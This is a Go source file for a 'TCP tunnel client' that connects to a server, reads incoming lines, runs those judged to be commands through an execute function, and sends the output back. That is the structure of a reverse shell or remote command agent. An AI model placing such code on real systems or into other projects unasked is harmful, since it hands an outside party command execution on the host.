package main

import (
	"bufio"
	"fmt"
	"net"
)

type TcpTunnelClient struct {
	serverConn net.Conn
	errorChan  chan error
}

func NewTcpTunnelClient() TcpTunnelClient {
	return TcpTunnelClient{
		errorChan: make(chan error),
	}
}

func (t *TcpTunnelClient) Connect(serverAddress string) error {
	conn, err := net.Dial("tcp", serverAddress)
	if err != nil {
		return fmt.Errorf("[TcpTunnelClient_Connect] Connection failed to %s. Error: %w\n", serverAddress, err)
	}

	t.serverConn = conn

	fmt.Printf("Connected to server at address %s\n", serverAddress)

	if _, err := conn.Write([]byte("Hello from client!\n")); err != nil {
		return fmt.Errorf("[TcpTunnelClient_Connect] Greetung message failed. Error: %w\n", err)
	}

	return nil
}

func (t *TcpTunnelClient) Run() error {
	defer t.serverConn.Close()

	reader := bufio.NewReader(t.serverConn)
	for {
		select {
		case err := <-t.errorChan:
			return err
		default:
			buf, _, err := reader.ReadLine()
			inMsg := string(buf)
			if err != nil {
				return err
			}

			fmt.Printf("Msg from server: %s\n", inMsg)

			if isCommand(inMsg) {
				go t.handleCommand(inMsg)
			}
		}
	}
}

func (t *TcpTunnelClient) handleCommand(command string) {
	cmdOut, cmdErr := execute(command)
	cmdErrString := ""
	if cmdErr != nil {
		cmdErrString = cmdErr.Error()
	}

	_, outErr := t.serverConn.Write([]byte("Command output:\n" + cmdOut + "\n"))
	_, errErr := t.serverConn.Write([]byte("Command error:\n" + cmdErrString + "\n"))

	if outErr != nil {
		t.errorChan <- outErr
	}
	if errErr != nil {
		t.errorChan <- errErr
	}
}
